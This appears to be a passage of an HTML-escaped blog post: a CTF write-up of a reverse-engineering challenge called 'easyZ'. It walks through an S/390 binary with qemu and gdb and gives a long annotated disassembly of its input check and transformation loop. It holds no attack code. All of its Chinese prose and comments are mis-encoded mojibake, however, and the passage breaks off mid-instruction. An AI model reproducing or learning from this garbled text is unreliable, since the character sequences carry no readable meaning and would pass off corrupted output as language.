    <content type="html"><![CDATA[<p>æ€»çš„æ¥è¯´è¿™æ¬¡çš„reéƒ½è¿˜å¥½ã€‚<a id="more"></a></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="easyZ"><a href="#easyZ" class="headerlink" title="easyZ"></a>easyZ</h3><p>ä¸€ä¸ªä¸å¤ªå¸¸è§æ¶æ„<strong>S/390</strong>çš„ç¨‹åºï¼Œidaåå‘ç°ä¸èƒ½åæ±‡ç¼–ï¼ŒæŠ¥é”™ã€‚ã€‚</p><p>ç„¶ååœ¨linuxä¸‹ä½¿ç”¨qemuæ¥æ¨¡æ‹Ÿäº†ç¨‹åºçš„è¿è¡Œï¼Œç¡®å®šå…³é”®å­—ç¬¦ä¸²ï¼š<strong>Please input your string:</strong></p><p>åœ¨æ‰€ç»™çš„hex.txtæœç´¢è¯¥å­—ç¬¦ä¸²å®šä½å…³é”®å­—ç¬¦ä¸²çš„åœ°å€ï¼Œå†åˆ°dis.txtæ–‡ä»¶ä¸­æœç´¢è¯¥åœ°å€å®šä½åˆ°å…³é”®æ±‡ç¼–æŒ‡ä»¤åœ°å€å¤„ã€‚</p><p>æ¥ç€ä½¿ç”¨qemuåœ¨gdbä¸€ä¸ªç«¯å£è¿›è¡Œä¸‹æ–­è°ƒè¯•éªŒè¯ä¸€ä¸‹ï¼š</p><p><img src="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AF/image-20201102131400699.png" alt></p><p>å‰©ä¸‹å°±æ˜¯æŸ¥çœ‹æ–‡æ¡£<a href="http://www.tachyonsoft.com/inst390m.htm" target="_blank" rel="noopener">z Architectureæ±‡ç¼–æ‰‹å†Œ</a>æ¥æ‰‹æ’¸æ±‡ç¼–ä»£ç ã€‚æœ€åæ•´ç†å…³é”®å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1000910</span>:eb bf f0 <span class="number">58</span> <span class="number">00</span> <span class="number">24</span> stmg%r11,%r15,<span class="number">88</span>(%r15)  <span class="comment">//ç¬¬ä¸€ä¸ªå…³é”®å‡½æ•°</span></span><br><span class="line"><span class="number">1000916</span>:e3 f0 ff <span class="number">50</span> ff <span class="number">71</span> lay%r15,<span class="number">-176</span>(%r15)  <span class="comment">//lea</span></span><br><span class="line"><span class="number">100091</span>c:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000920</span>:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">24</span> stg%r2,<span class="number">160</span>(%r11)    <span class="comment">//r2 = r11+160  input</span></span><br><span class="line"><span class="number">1000926</span>:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">04</span> lg%r2,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100092</span>c:c0 e5 ff ff ff <span class="number">02</span> brasl%r14,<span class="number">0x1000730</span></span><br><span class="line"><span class="number">1000932</span>:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2 <span class="comment">//mov</span></span><br><span class="line"><span class="number">1000936</span>:a7 <span class="number">1f</span> <span class="number">00</span> <span class="number">20</span>       cghi%r1,<span class="number">32</span>   <span class="comment">//cmp len(input), 32</span></span><br><span class="line"><span class="number">100093</span>a:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">06</span>       je<span class="number">0x1000946</span></span><br><span class="line"><span class="number">100093</span>e:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">00</span>       lhi%r1,<span class="number">0</span></span><br><span class="line"><span class="number">1000942</span>:a7 f4 <span class="number">00</span> <span class="number">56</span>       j<span class="number">0x10009ee</span></span><br><span class="line"><span class="number">1000946</span>:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">172</span>(%r11),<span class="number">0</span></span><br><span class="line"><span class="number">100094</span>c:a7 f4 <span class="number">00</span> <span class="number">49</span>       j<span class="number">0x10009de</span></span><br><span class="line"><span class="number">1000950</span>:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000956</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100095</span>c:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">1000960</span>:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000964</span>:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">2f</span> clfi%r1,<span class="number">47</span></span><br><span class="line"><span class="number">100096</span>a:a7 c4 <span class="number">00</span> <span class="number">11</span>       jle<span class="number">0x100098c</span></span><br><span class="line"><span class="number">100096</span>e:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000974</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100097</span>a:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">100097</span>e:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000982</span>:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">39</span> clfi%r1,<span class="number">57</span></span><br><span class="line"><span class="number">1000988</span>:a7 c4 <span class="number">00</span> <span class="number">24</span>       jle<span class="number">0x10009d0</span></span><br><span class="line"><span class="number">100098</span>c:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000992</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">1000998</span>:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">100099</span>c:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">10009</span>a0:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">60</span> clfi%r1,<span class="number">96</span></span><br><span class="line"><span class="number">10009</span>a6:a7 c4 <span class="number">00</span> <span class="number">11</span>       jle<span class="number">0x10009c8</span></span><br><span class="line"><span class="number">10009</span>aa:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">10009b</span>0:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">10009b</span>6:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">10009b</span>a:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">10009b</span>e:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">66</span> clfi%r1,<span class="number">102</span></span><br><span class="line"><span class="number">10009</span>c4:a7 c4 <span class="number">00</span> <span class="number">09</span>       jle<span class="number">0x10009d6</span></span><br><span class="line"><span class="number">10009</span>c8:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">00</span>       lhi%r1,<span class="number">0</span></span><br><span class="line"><span class="number">10009</span>cc:a7 f4 <span class="number">00</span> <span class="number">11</span>       j<span class="number">0x10009ee</span></span><br><span class="line"><span class="number">10009</span>d0:<span class="number">18</span> <span class="number">00</span>             lr%r0,%r0</span><br><span class="line"><span class="number">10009</span>d2:a7 f4 <span class="number">00</span> <span class="number">03</span>       j<span class="number">0x10009d8</span></span><br><span class="line"><span class="number">10009</span>d6:<span class="number">18</span> <span class="number">00</span>             lr%r0,%r0</span><br><span class="line"><span class="number">10009</span>d8:eb <span class="number">01</span> b0 ac <span class="number">00</span> <span class="number">6</span>a asi<span class="number">172</span>(%r11),<span class="number">1</span></span><br><span class="line"><span class="number">10009</span>de:<span class="number">58</span> <span class="number">10</span> b0 ac       l%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">10009e2</span>:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span></span><br><span class="line"><span class="number">10009e6</span>:a7 c4 ff b5       jle<span class="number">0x1000950</span></span><br><span class="line"><span class="number">10009</span>ea:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">01</span>       lhi%r1,<span class="number">1</span></span><br><span class="line"><span class="number">10009</span>ee:b9 <span class="number">14</span> <span class="number">00</span> <span class="number">11</span>       lgfr%r1,%r1</span><br><span class="line"><span class="number">10009f</span>2:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">10009f</span>6:e3 <span class="number">40</span> b1 <span class="number">20</span> <span class="number">00</span> <span class="number">04</span> lg%r4,<span class="number">288</span>(%r11)</span><br><span class="line"><span class="number">10009f</span>c:eb bf b1 <span class="number">08</span> <span class="number">00</span> <span class="number">04</span> lmg%r11,%r15,<span class="number">264</span>(%r11)</span><br><span class="line"><span class="number">1000</span>a02:<span class="number">07</span> f4             br%r4</span><br><span class="line"><span class="number">1000</span>a04:<span class="number">07</span> <span class="number">07</span>             nopr%r7</span><br><span class="line"><span class="number">1000</span>a06:<span class="number">07</span> <span class="number">07</span>             nopr%r7</span><br><span class="line"><span class="number">1000</span>a08:b3 c1 <span class="number">00</span> <span class="number">2b</span>       ldgr%f2,%r11  <span class="comment">//åŠ å¯†åˆ¤æ–­å‡½æ•°</span></span><br><span class="line"><span class="number">1000</span>a0c:b3 c1 <span class="number">00</span> <span class="number">0f</span>       ldgr%f0,%r15</span><br><span class="line"><span class="number">1000</span>a10:e3 f0 ff <span class="number">48</span> ff <span class="number">71</span> lay%r15,<span class="number">-184</span>(%r15)</span><br><span class="line"><span class="number">1000</span>a16:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000</span>a1a:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">24</span> stg%r2,<span class="number">160</span>(%r11)        <span class="comment">//input</span></span><br><span class="line"><span class="number">1000</span>a20:e5 <span class="number">4</span>c b0 a8 <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">168</span>(%r11),<span class="number">0</span> <span class="comment">//mov ç«‹å³æ•°</span></span><br><span class="line"><span class="number">1000</span>a26:a7 f4 <span class="number">00</span> <span class="number">4b</span>       j<span class="number">0x1000abc</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a2a:e3 <span class="number">10</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">168</span>(%r11)  <span class="comment">//å¾ªç¯</span></span><br><span class="line"><span class="number">1000</span>a30:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)<span class="comment">//r1 = input[i]</span></span><br><span class="line"><span class="number">1000</span>a36:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">1000</span>a3a:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000</span>a3e:<span class="number">50</span> <span class="number">10</span> b0 b4       st%r1,<span class="number">180</span>(%r11)<span class="comment">//r11[180] = r1</span></span><br><span class="line"><span class="number">1000</span>a42:<span class="number">58</span> <span class="number">30</span> b0 b4       l%r3,<span class="number">180</span>(%r11) <span class="comment">//r3 = r1</span></span><br><span class="line"><span class="number">1000</span>a46:<span class="number">71</span> <span class="number">30</span> b0 b4       ms%r3,<span class="number">180</span>(%r11)<span class="comment">//r3*r3</span></span><br><span class="line"><span class="number">1000</span>a4a:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 ef larl%r1,<span class="number">0x109b228</span><span class="comment">//</span></span><br><span class="line"><span class="number">1000</span>a50:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)   <span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a56:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// &lt;&lt; 2  (*4)</span></span><br><span class="line"><span class="number">1000</span>a5c:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">// 0x109b228[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000</span>a60:b2 <span class="number">52</span> <span class="number">00</span> <span class="number">31</span>       msr%r3,%r1<span class="comment">//input[i]*input[i]*0x109b228[i&lt;&lt;2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a64:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 e2 larl%r1,<span class="number">0x109b228</span></span><br><span class="line"><span class="number">1000</span>a6a:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a70:a7 <span class="number">2b</span> <span class="number">00</span> <span class="number">20</span>       aghi%r2,<span class="number">32</span><span class="comment">//add + 32</span></span><br><span class="line"><span class="number">1000</span>a74:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>a7a:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//0x109b228[(i+32)&lt;&lt;2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a7e:<span class="number">71</span> <span class="number">10</span> b0 b4       ms%r1,<span class="number">180</span>(%r11)<span class="comment">//0x109b228[(i+32)&lt;&lt;2]*input[i]</span></span><br><span class="line"><span class="number">1000</span>a82:<span class="number">1</span>a <span class="number">31</span>             ar%r3,%r1<span class="comment">//input[i]*input[i]*0x109b228[i&lt;&lt;2] + 0x109b228[(i+32)&lt;&lt;2]*input[i]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a84:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 d2 larl%r1,<span class="number">0x109b228</span></span><br><span class="line"><span class="number">1000</span>a8a:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a90:a7 <span class="number">2b</span> <span class="number">00</span> <span class="number">40</span>       aghi%r2,<span class="number">64</span><span class="comment">//i+64</span></span><br><span class="line"><span class="number">1000</span>a94:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">//(i+64) &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>a9a:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//r1 = 0x109b228[(i+64) &lt;&lt; 2]</span></span><br><span class="line"><span class="number">1000</span>a9e:<span class="number">1</span>a <span class="number">31</span>             ar%r3,%r1<span class="comment">//add r3 +  0x109b228[(i+64) &lt;&lt; 2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>aa0:c4 <span class="number">18</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">68</span> lgrl%r1,<span class="number">0x109b170</span></span><br><span class="line"><span class="number">1000</span>aa6:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)  <span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>aac:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>ab2:<span class="number">50</span> <span class="number">32</span> <span class="number">10</span> <span class="number">00</span>       st%r3,<span class="number">0</span>(%r2,%r1)r1[r2] = r3, <span class="number">0x109dd08</span></span><br><span class="line"><span class="number">1000</span>ab6:eb <span class="number">01</span> b0 a8 <span class="number">00</span> <span class="number">6</span>a asi<span class="number">168</span>(%r11),<span class="number">1</span> <span class="comment">//i++;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>abc:<span class="number">58</span> <span class="number">10</span> b0 a8       l%r1,<span class="number">168</span>(%r11)<span class="comment">//mov eax, i(168(%r11));</span></span><br><span class="line"><span class="number">1000</span>ac0:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span></span><br><span class="line"><span class="number">1000</span>ac4:a7 c4 ff b3       jle<span class="number">0x1000a2a</span>   <span class="comment">//cmp </span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>ac8:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">01</span> mvhi<span class="number">172</span>(%r11),<span class="number">1</span> <span class="comment">//j = 1</span></span><br><span class="line"><span class="number">1000</span>ace:e5 <span class="number">4</span>c b0 b0 <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">176</span>(%r11),<span class="number">0</span><span class="comment">//i = 0</span></span><br><span class="line"><span class="number">1000</span>ad4:a7 f4 <span class="number">00</span> <span class="number">21</span>       j<span class="number">0x1000b16</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>ad8:c4 <span class="number">18</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">4</span>c lgrl%r1,<span class="number">0x109b170</span>  <span class="comment">//åˆ¤æ–­å¾ªç¯  åŠ å¯†åçš„æ•°æ®</span></span><br><span class="line"><span class="number">1000</span>ade:e3 <span class="number">20</span> b0 b0 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>ae4:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">//i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>aea:<span class="number">58</span> <span class="number">32</span> <span class="number">10</span> <span class="number">00</span>       l%r3,<span class="number">0</span>(%r2,%r1)<span class="comment">//enc[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000</span>aee:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">5</span>d larl%r1,<span class="number">0x109b1a8</span></span><br><span class="line"><span class="number">1000</span>af4:e3 <span class="number">20</span> b0 b0 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>afa:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000b</span>00:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//d[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000b</span>04:<span class="number">19</span> <span class="number">31</span>             cr%r3,%r1</span><br><span class="line"><span class="number">1000b</span>06:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">05</span>       je<span class="number">0x1000b10</span></span><br><span class="line"><span class="number">1000b</span>0a:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">172</span>(%r11),<span class="number">0</span></span><br><span class="line"><span class="number">1000b</span>10:eb <span class="number">01</span> b0 b0 <span class="number">00</span> <span class="number">6</span>a asi<span class="number">176</span>(%r11),<span class="number">1</span> <span class="comment">//add</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>16:<span class="number">58</span> <span class="number">10</span> b0 b0       l%r1,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000b</span>1a:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span><span class="comment">//cmp</span></span><br><span class="line"><span class="number">1000b</span>1e:a7 c4 ff dd       jle<span class="number">0x1000ad8</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>22:<span class="number">58</span> <span class="number">10</span> b0 ac       l%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000b</span>26:b9 <span class="number">14</span> <span class="number">00</span> <span class="number">11</span>       lgfr%r1,%r1</span><br><span class="line"><span class="number">1000b</span>2a:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">1000b</span>2e:b3 cd <span class="number">00</span> b2       lgdr%r11,%f2</span><br><span class="line"><span class="number">1000b</span>32:b3 cd <span class="number">00</span> f0       lgdr%r15,%f0</span><br><span class="line"><span class="number">1000b</span>36:<span class="number">07</span> fe             br%r14</span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>38:eb bf f0 <span class="number">58</span> <span class="number">00</span> <span class="number">24</span> stmg%r11,%r15,<span class="number">88</span>(%r15)   <span class="comment">//mainå‡½æ•°</span></span><br><span class="line"><span class="number">1000b</span>3e:e3 f0 ff <span class="number">20</span> ff <span class="number">71</span> lay%r15,<span class="number">-224</span>(%r15)</span><br><span class="line"><span class="number">1000b</span>44:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000b</span>48:b2 <span class="number">4f</span> <span class="number">00</span> <span class="number">10</span>       ear%r1,%a0</span><br><span class="line"><span class="number">1000b</span>4c:eb <span class="number">11</span> <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">0</span>d sllg%r1,%r1,<span class="number">32</span></span><br><span class="line"><span class="number">1000b</span>52:b2 <span class="number">4f</span> <span class="number">00</span> <span class="number">11</span>       ear%r1,%a1</span><br><span class="line"><span class="number">1000b</span>56:d2 <span class="number">07</span> b0 d8 <span class="number">10</span> <span class="number">28</span> mvc<span class="number">216</span>(<span class="number">8</span>,%r11),<span class="number">40</span>(%r1)</span><br><span class="line"><span class="number">1000b</span>5c:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">84</span> larl%r2,<span class="number">0x1071064</span> <span class="comment">//please input ...</span></span><br><span class="line"><span class="number">1000b</span>62:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">43</span> brasl%r14,<span class="number">0x1008be8</span><span class="comment">//printf</span></span><br><span class="line"><span class="number">1000b</span>68:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span></span><br><span class="line"><span class="number">1000b</span>6e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">31</span>       lgr%r3,%r1</span><br><span class="line"><span class="number">1000b</span>72:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">87</span> larl%r2,<span class="number">0x1071080</span>      <span class="comment">// %s</span></span><br><span class="line"><span class="number">1000b</span>78:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">3</span>a <span class="number">5</span>c brasl%r14,<span class="number">0x1008030</span> <span class="comment">// scanf(" ");</span></span><br><span class="line"><span class="number">1000b</span>7e:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span> <span class="comment">//add  </span></span><br><span class="line"><span class="number">1000b</span>84:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1%r1 : input</span><br><span class="line"><span class="number">1000b</span>88:c0 e5 ff ff fe c4 brasl%r14,<span class="number">0x1000910</span><span class="comment">//å…³é”®åŠ å¯†å‡½æ•°ã€‚</span></span><br><span class="line"><span class="number">1000b</span>8e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2<span class="comment">//mov</span></span><br><span class="line"><span class="number">1000b</span>92:<span class="number">12</span> <span class="number">11</span>             ltr%r1,%r1 <span class="comment">//cmp  test</span></span><br><span class="line"><span class="number">1000b</span>94:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">17</span>       je<span class="number">0x1000bc2</span></span><br><span class="line"><span class="number">1000b</span>98:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span></span><br><span class="line"><span class="number">1000b</span>9e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">1000b</span>a2:c0 e5 ff ff ff <span class="number">33</span> brasl%r14,<span class="number">0x1000a08</span></span><br><span class="line"><span class="number">1000b</span>a8:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2</span><br><span class="line"><span class="number">1000b</span>ac:<span class="number">12</span> <span class="number">11</span>             ltr%r1,%r1</span><br><span class="line"><span class="number">1000b</span>ae:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">0</span>a       je<span class="number">0x1000bc2</span></span><br><span class="line"><span class="number">1000b</span>b2:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> 